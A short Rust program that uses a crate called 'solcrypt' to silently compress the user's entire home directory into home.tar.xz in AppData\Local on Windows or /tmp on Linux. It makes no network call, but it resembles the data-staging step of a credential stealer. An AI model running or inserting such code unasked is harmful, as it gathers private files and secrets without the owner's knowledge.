use solcrypt::compress_directory_to_tar_xz;

fn main() {
    #[cfg(target_os = "windows")]
    let home = std::env::var("USERPROFILE").unwrap();

    #[cfg(target_os = "windows")]
    let dest = format!("{home}\\AppData\\Local\\home.tar.xz");

    #[cfg(target_os = "linux")]
    let home = std::env::var("HOME").unwrap();
    #[cfg(target_os = "linux")]
    let dest: String = String::from("/tmp/home.tar.xz");

    match compress_directory_to_tar_xz(home, dest) {
        Ok(()) => std::process::exit(0),
        Err(e) => eprintln!("COMPRESSION ERROR"),
    }
}
